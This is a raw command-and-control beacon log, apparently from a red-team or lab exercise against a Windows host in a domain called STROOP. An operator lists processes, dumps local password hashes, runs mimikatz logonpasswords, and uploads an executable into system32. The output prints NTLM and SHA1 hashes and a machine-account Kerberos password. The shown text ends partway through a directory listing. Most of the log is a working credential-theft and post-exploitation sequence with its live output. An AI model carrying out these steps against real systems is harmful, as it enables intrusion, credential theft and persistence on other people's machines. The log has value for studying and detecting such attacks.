03/30 08:44:17 UTC [metadata] 13.81.175.72 <- 10.1.3.11; computer: L-WIN224; user: W.Tax *; process: wsmprovhost.exe; pid: 4164; os: Windows; version: 10.0; beacon arch: x64 (x64)
03/30 08:44:25 UTC [input] <neo> ps
03/30 08:44:25 UTC [task] <T1057> Tasked beacon to list processes
03/30 08:44:27 UTC [checkin] host called home, sent: 12 bytes
03/30 08:44:27 UTC [output]
[System Process]	0	0
System	0	4	x64		0
ShellExperienceHost.exe	916	6248	x64	STROOP\W.Trommel	2
SearchUI.exe	916	6440	x64	STROOP\W.Trommel	2
RuntimeBroker.exe	916	6520	x64	STROOP\W.Trommel	2
RuntimeBroker.exe	916	6732	x64	STROOP\W.Trommel	2
powershell.exe	5472	6976	x64	STROOP\W.Trommel	2
conhost.exe	6976	6992	x64	STROOP\W.Trommel	2
powershell.exe	5472	7112	x64	STROOP\W.Trommel	2
conhost.exe	7112	7124	x64	STROOP\W.Trommel	2
RuntimeBroker.exe	916	1380	x64	STROOP\W.Trommel	2
iexplore.exe	916	2836	x64	STROOP\W.Trommel	2
iexplore.exe	2836	6988	x86	STROOP\W.Trommel	2
smartscreen.exe	916	7236	x64	STROOP\W.Trommel	2
SecurityHealthSystray.exe	5992	7284	x64	STROOP\W.Trommel	2
svchost.exe	692	7508	x64	NT AUTHORITY\SYSTEM	0
LogonUI.exe	1688	2440	x64	NT AUTHORITY\SYSTEM	2
svchost.exe	692	7396	x64	STROOP\W.Trommel	2
svchost.exe	692	5280	x64	NT AUTHORITY\LOCAL SERVICE	0
dllhost.exe	916	8172	x64	STROOP\W.Trommel	2
SearchProtocolHost.exe	68	6864	x64	STROOP\W.Trommel	2
FlashUtil_ActiveX.exe	916	6096	x64	STROOP\W.Trommel	2
SearchProtocolHost.exe	68	4112	x64	NT AUTHORITY\SYSTEM	0
wsmprovhost.exe	916	4164	x64	STROOP\W.Tax	0
SearchFilterHost.exe	68	2992	x64	NT AUTHORITY\SYSTEM	0


03/30 08:44:33 UTC [input] <neo> hashdump
03/30 08:44:33 UTC [task] <T1003, T1055, T1093> Tasked beacon to dump hashes
03/30 08:44:37 UTC [checkin] host called home, sent: 82501 bytes
03/30 08:44:38 UTC [output]
received password hashes:
bofh:500:aad3b435b51404eeaad3b435b51404ee:e2fb4576f49d1badae64eeb8cd050e19:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9480a886367fa07551dceadca7c741da:::


03/30 08:44:42 UTC [input] <neo> logonpasswords
03/30 08:44:42 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
03/30 08:44:43 UTC [checkin] host called home, sent: 417362 bytes
03/30 08:44:44 UTC [output]
received output:

Authentication Id : 0 ; 1187171 (00000000:00121d63)
Session           : RemoteInteractive from 2
User Name         : w.trommel
Domain            : STROOP
Logon Server      : S-WIN22
Logon Time        : 3/30/2020 8:36:40 AM
SID               : S-1-5-21-2163199188-2306780613-1636707950-4709
	msv :
	 [00000003] Primary
	 * Username : W.Trommel
	 * Domain   : STROOP
	 * NTLM     : e4a22d8e7bbec871b341c88c2e94cba2
	 * SHA1     : e4d319d431fc5f20f9b459d40870854c840834d7
	 * DPAPI    : e4c81fcb4b66f54c7d549fb446425a9c
	tspkg :
	wdigest :
	 * Username : W.Trommel
	 * Domain   : STROOP
	 * Password : (null)
	kerberos :
	 * Username : W.Trommel
	 * Domain   : STROOP.LOCAL
	 * Password : (null)
	ssp :
	credman :

Authentication Id : 0 ; 1187067 (00000000:00121cfb)
Session           : RemoteInteractive from 2
User Name         : w.trommel
Domain            : STROOP
Logon Server      : S-WIN22
Logon Time        : 3/30/2020 8:36:40 AM
SID               : S-1-5-21-2163199188-2306780613-1636707950-4709
	msv :
	 [00000003] Primary
	 * Username : W.Trommel
	 * Domain   : STROOP
	 * NTLM     : e4a22d8e7bbec871b341c88c2e94cba2
	 * SHA1     : e4d319d431fc5f20f9b459d40870854c840834d7
	 * DPAPI    : e4c81fcb4b66f54c7d549fb446425a9c
	tspkg :
	wdigest :
	 * Username : W.Trommel
	 * Domain   : STROOP
	 * Password : (null)
	kerberos :
	 * Username : w.trommel
	 * Domain   : STROOP.LOCAL
	 * Password : (null)
	ssp :
	credman :

Authentication Id : 0 ; 1155726 (00000000:0011a28e)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/30/2020 8:36:40 AM
SID               : S-1-5-90-0-2
	msv :
	 [00000003] Primary
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * NTLM     : b7fdacb33b890f235bf7e107ecf00d41
	 * SHA1     : 81d84bb5789059ccca5504e4fb218b243ce2e820
	tspkg :
	wdigest :
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * Password : (null)
	kerberos :
	 * Username : L-WIN224$
	 * Domain   : stroop.local
	 * Password : kfB2!<Pv] V;"l<gPvY>9ssJ".!\C0SQjy%ER>("1:$E8]v<9c5a]Er2^.!1C7v<KvV$Xs1_8\nrL)SoRi/L#Z[8xLQ"'D^Zs!wO/2fL]Mnv[^k6WrcnX2#8
	ssp :
	credman :

Authentication Id : 0 ; 1154809 (00000000:00119ef9)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/30/2020 8:36:40 AM
SID               : S-1-5-90-0-2
	msv :
	 [00000003] Primary
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * NTLM     : b7fdacb33b890f235bf7e107ecf00d41
	 * SHA1     : 81d84bb5789059ccca5504e4fb218b243ce2e820
	tspkg :
	wdigest :
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * Password : (null)
	kerberos :
	 * Username : L-WIN224$
	 * Domain   : stroop.local
	 * Password : kfB2!<Pv] V;"l<gPvY>9ssJ".!\C0SQjy%ER>("1:$E8]v<9c5a]Er2^.!1C7v<KvV$Xs1_8\nrL)SoRi/L#Z[8xLQ"'D^Zs!wO/2fL]Mnv[^k6WrcnX2#8
	ssp :
	credman :

Authentication Id : 0 ; 1151719 (00000000:001192e7)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/30/2020 8:36:40 AM
SID               : S-1-5-96-0-2
	msv :
	 [00000003] Primary
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * NTLM     : b7fdacb33b890f235bf7e107ecf00d41
	 * SHA1     : 81d84bb5789059ccca5504e4fb218b243ce2e820
	tspkg :
	wdigest :
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * Password : (null)
	kerberos :
	 * Username : L-WIN224$
	 * Domain   : stroop.local
	 * Password : kfB2!<Pv] V;"l<gPvY>9ssJ".!\C0SQjy%ER>("1:$E8]v<9c5a]Er2^.!1C7v<KvV$Xs1_8\nrL)SoRi/L#Z[8xLQ"'D^Zs!wO/2fL]Mnv[^k6WrcnX2#8
	ssp :
	credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 3/30/2020 7:45:29 AM
SID               : S-1-5-19
	msv :
	tspkg :
	wdigest :
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :
	credman :

Authentication Id : 0 ; 52152 (00000000:0000cbb8)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/30/2020 7:45:29 AM
SID               : S-1-5-90-0-1
	msv :
	 [00000003] Primary
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * NTLM     : b7fdacb33b890f235bf7e107ecf00d41
	 * SHA1     : 81d84bb5789059ccca5504e4fb218b243ce2e820
	tspkg :
	wdigest :
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * Password : (null)
	kerberos :
	 * Username : L-WIN224$
	 * Domain   : stroop.local
	 * Password : kfB2!<Pv] V;"l<gPvY>9ssJ".!\C0SQjy%ER>("1:$E8]v<9c5a]Er2^.!1C7v<KvV$Xs1_8\nrL)SoRi/L#Z[8xLQ"'D^Zs!wO/2fL]Mnv[^k6WrcnX2#8
	ssp :
	credman :

Authentication Id : 0 ; 52021 (00000000:0000cb35)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/30/2020 7:45:29 AM
SID               : S-1-5-90-0-1
	msv :
	 [00000003] Primary
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * NTLM     : b7fdacb33b890f235bf7e107ecf00d41
	 * SHA1     : 81d84bb5789059ccca5504e4fb218b243ce2e820
	tspkg :
	wdigest :
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * Password : (null)
	kerberos :
	 * Username : L-WIN224$
	 * Domain   : stroop.local
	 * Password : kfB2!<Pv] V;"l<gPvY>9ssJ".!\C0SQjy%ER>("1:$E8]v<9c5a]Er2^.!1C7v<KvV$Xs1_8\nrL)SoRi/L#Z[8xLQ"'D^Zs!wO/2fL]Mnv[^k6WrcnX2#8
	ssp :
	credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : L-WIN224$
Domain            : STROOP
Logon Server      : (null)
Logon Time        : 3/30/2020 7:45:29 AM
SID               : S-1-5-20
	msv :
	 [00000003] Primary
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * NTLM     : b7fdacb33b890f235bf7e107ecf00d41
	 * SHA1     : 81d84bb5789059ccca5504e4fb218b243ce2e820
	tspkg :
	wdigest :
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * Password : (null)
	kerberos :
	 * Username : l-win224$
	 * Domain   : STROOP.LOCAL
	 * Password : (null)
	ssp :
	credman :

Authentication Id : 0 ; 29685 (00000000:000073f5)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/30/2020 7:45:29 AM
SID               : S-1-5-96-0-1
	msv :
	 [00000003] Primary
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * NTLM     : b7fdacb33b890f235bf7e107ecf00d41
	 * SHA1     : 81d84bb5789059ccca5504e4fb218b243ce2e820
	tspkg :
	wdigest :
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * Password : (null)
	kerberos :
	 * Username : L-WIN224$
	 * Domain   : stroop.local
	 * Password : kfB2!<Pv] V;"l<gPvY>9ssJ".!\C0SQjy%ER>("1:$E8]v<9c5a]Er2^.!1C7v<KvV$Xs1_8\nrL)SoRi/L#Z[8xLQ"'D^Zs!wO/2fL]Mnv[^k6WrcnX2#8
	ssp :
	credman :

Authentication Id : 0 ; 29582 (00000000:0000738e)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/30/2020 7:45:29 AM
SID               : S-1-5-96-0-0
	msv :
	 [00000003] Primary
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * NTLM     : b7fdacb33b890f235bf7e107ecf00d41
	 * SHA1     : 81d84bb5789059ccca5504e4fb218b243ce2e820
	tspkg :
	wdigest :
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * Password : (null)
	kerberos :
	 * Username : L-WIN224$
	 * Domain   : stroop.local
	 * Password : kfB2!<Pv] V;"l<gPvY>9ssJ".!\C0SQjy%ER>("1:$E8]v<9c5a]Er2^.!1C7v<KvV$Xs1_8\nrL)SoRi/L#Z[8xLQ"'D^Zs!wO/2fL]Mnv[^k6WrcnX2#8
	ssp :
	credman :

Authentication Id : 0 ; 27214 (00000000:00006a4e)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 3/30/2020 7:45:28 AM
SID               :
	msv :
	 [00000003] Primary
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * NTLM     : b7fdacb33b890f235bf7e107ecf00d41
	 * SHA1     : 81d84bb5789059ccca5504e4fb218b243ce2e820
	tspkg :
	wdigest :
	kerberos :
	ssp :
	credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : L-WIN224$
Domain            : STROOP
Logon Server      : (null)
Logon Time        : 3/30/2020 7:45:28 AM
SID               : S-1-5-18
	msv :
	tspkg :
	wdigest :
	 * Username : L-WIN224$
	 * Domain   : STROOP
	 * Password : (null)
	kerberos :
	 * Username : l-win224$
	 * Domain   : STROOP.LOCAL
	 * Password : (null)
	ssp :
	credman :


03/30 08:51:19 UTC [input] <neo> pwd
03/30 08:51:19 UTC [task] <> Tasked beacon to print working directory
03/30 08:51:21 UTC [checkin] host called home, sent: 8 bytes
03/30 08:51:22 UTC [output]
Current directory is C:\windows\system32

03/30 08:52:03 UTC [input] <neo> upload
03/30 08:52:11 UTC [task] <> Tasked beacon to upload C:\Users\outflank\Desktop\netsrv.exe as netsrv.exe
03/30 08:52:11 UTC [indicator] file: a1a6090d13b60164ca3481dabf8cba86 289280 bytes netsrv.exe
03/30 08:52:15 UTC [checkin] host called home, sent: 289302 bytes
03/30 08:52:21 UTC [input] <neo> ls netsrv.exe
03/30 08:52:21 UTC [task] <> Tasked beacon to list files in netsrv.exe
03/30 08:52:25 UTC [checkin] host called home, sent: 28 bytes
03/30 08:52:25 UTC [error] could not open netsrv.exe\*: 267
03/30 08:52:27 UTC [input] <neo> ls
03/30 08:52:27 UTC [task] <> Tasked beacon to list files in .
03/30 08:52:30 UTC [checkin] host called home, sent: 19 bytes
03/30 08:52:30 UTC [output]
C:\windows\system32\*
D	0	03/30/2020 08:52:15	.
D	0	03/30/2020 08:52:15	..
D	0	09/15/2018 09:07:52	0409
F	232	09/15/2018 07:28:43	@AppHelpToast.png
F	308	09/15/2018 07:28:42	@AudioToastIcon.png
F	450	09/15/2018 07:28:30	@BackgroundAccessToastIcon.png
F	199	09/15/2018 07:28:50	@bitlockertoastimage.png
F	14791	09/15/2018 07:28:50	@edptoastimage.png
F	330	09/15/2018 07:28:51	@EnrollmentToastIcon.png
F	563	09/15/2018 07:28:53	@language_notification_icon.png
F	483	09/15/2018 07:29:21	@optionalfeatures.png
F	404	09/15/2018 07:28:56	@VpnToastIcon.png
F	15106	09/15/2018 07:28:26	@WiFiNotificationIcon.png
F	195443	09/15/2018 07:29:13	@windows-hello-V4.1.gif
F	714	09/15/2018 07:29:13	@WindowsHelloFaceToastIcon.png
F	518	09/15/2018 07:28:39	@WindowsUpdateToastIcon.contrast-black.png
F	810	09/15/2018 07:28:39	@WindowsUpdateToastIcon.contrast-white.png
F	518	09/15/2018 07:28:39	@WindowsUpdateToastIcon.png
F	691	09/15/2018 07:29:14	@WirelessDisplayToast.png
F	155	09/15/2018 07:28:36	@WwanNotificationIcon.png
F	352	09/15/2018 07:28:36	@WwanSimLockIcon.png
F	196608	09/15/2018 07:28:30	aadauthhelper.dll
F	692736	03/07/2020 00:53:37	aadcloudap.dll
F	68096	09/15/2018 07:28:38	aadjcsp.dll
F	1824768	03/07/2020 00:53:37	aadtb.dll
F	145720	09/15/2018 07:28:30	aadWamExtension.dll
F	413200	09/15/2018 07:28:56	AboutSettingsHandlers.dll
F	400384	03/07/2020 00:53:43	AboveLockAppHost.dll
F	3838976	09/15/2018 07:28:42	accessibilitycpl.dll
F	273408	09/14/2018 17:59:00	accountaccessor.dll
F	441856	09/14/2018 17:58:00	AccountsRt.dll
F	350208	03/07/2020 00:54:17	AcGenral.dll
F	314368	03/07/2020 00:54:16	AcLayers.dll
F	11264	09/15/2018 07:29:14	acledit.dll
F	5504000	09/15/2018 07:29:14	aclui.dll
F	324624	03/07/2020 00:53:51	acmigration.dll
F	200192	03/07/2020 00:53:38	ACPBackgroundManagerPolicy.dll
F	82432	09/15/2018 07:28:42	acppage.dll
F	12800	09/15/2018 07:29:14	acproxy.dll
F	65024	09/15/2018 07:29:22	AcSpecfc.dll
F	313856	09/15/2018 07:28:51	ActionCenter.dll
F	560640	09/15/2018 07:28:52	ActionCenterCPL.dll
F	72704	09/15/2018 07:28:57	ActionMgr.dll
F	188928	09/15/2018 07:28:59	ActionQueue.dll
F	55808	09/15/2018 07:28:30	ActivationClient.dll
F	690176	03/07/2020 00:53:38	ActivationManager.dll
F	265728	09/15/2018 07:28:43	activeds.dll
F	112128	09/15/2018 07:28:43	activeds.tlb
F	101376	03/07/2020 00:54:28	ActiveSyncCsp.dll
F	1819136	09/14/2018 17:49:00	ActiveSyncProvider.dll
F	612864	09/15/2018 07:28:50	actxprxy.dll
F	32768	09/15/2018 07:29:24	AcWinRT.dll
F	15360	09/15/2018 07:29:22	AcXtrnal.dll
F	1300480	09/15/2018 07:28:30	AdaptiveCards.dll
F	67584	09/15/2018 07:28:36	AddressParser.dll
F	24064	09/15/2018 07:28:56	adhapi.dll
F	97792	09/15/2018 07:28:56	adhsvc.dll
F	534528	09/15/2018 09:10:02	AdmTmpl.dll
F	58368	09/15/2018 07:29:14	adprovider.dll
F	136192	09/15/2018 09:10:00	adrclient.dll
F	249344	09/15/2018 07:29:14	adsldp.dll
F	252928	09/15/2018 07:28:43	adsldpc.dll
F	101376	09/15/2018 07:29:14	adsmsext.dll
F	351232	09/15/2018 07:29:16	adsnt.dll
F	844288	09/15/2018 07:28:46	adtschema.dll
F	145408	03/07/2020 00:53:31	AdvancedEmojiDS.dll
D	0	09/15/2018 07:34:00	AdvancedInstallers
F	659720	09/15/2018 07:28:26	advapi32.dll
F	2560	09/15/2018 07:28:25	advapi32res.dll
F	144384	09/15/2018 07:28:51	advpack.dll
F	30720	09/15/2018 07:28:42	aeevts.dll
F	747536	03/07/2020 00:53:51	aeinv.dll
F	513544	03/07/2020 00:53:26	aepic.dll
F	1188352	03/07/2020 00:53:30	AgentService.exe
F	2871824	03/07/2020 00:53:51	aitstatic.exe
F	25088	09/15/2018 07:28:30	AJRouter.dll
F	94720	09/15/2018 07:28:38	alg.exe
F	162816	09/15/2018 07:29:14	altspace.dll
D	0	09/15/2018 07:34:00	am-et
F	18944	09/15/2018 09:08:37	amcompat.tlb
F	65536	09/15/2018 07:28:26	amsi.dll
F	14848	09/15/2018 07:28:26	amsiproxy.dll
F	97792	09/15/2018 07:29:21	amstream.dll
F	41984	09/15/2018 07:29:24	AnalogCommonProxyStub.dll
F	251904	09/15/2018 07:29:17	apds.dll
F	71680	09/14/2018 18:03:00	APHostClient.dll
F	16384	09/14/2018 18:03:00	APHostRes.dll
F	329728	09/14/2018 17:57:00	APHostService.dll
F	87040	03/07/2020 00:53:38	ApiSetHost.AppExecutionAlias.dll
F	116536	09/15/2018 07:28:25	apisetschema.dll
F	1267712	03/07/2020 00:53:44	APMon.dll
F	928768	03/07/2020 00:53:37	AppContracts.dll
F	178176	09/15/2018 07:28:29	AppExtension.dll
F	553984	03/07/2020 00:53:50	apphelp.dll
F	33792	09/15/2018 07:28:43	Apphlpdm.dll
F	114176	09/15/2018 07:28:30	AppHostRegistrationVerifier.exe
F	64784	09/15/2018 07:28:42	appidapi.dll
F	19456	09/15/2018 07:28:42	appidcertstorecheck.exe
F	158720	09/15/2018 07:28:42	appidpolicyconverter.exe
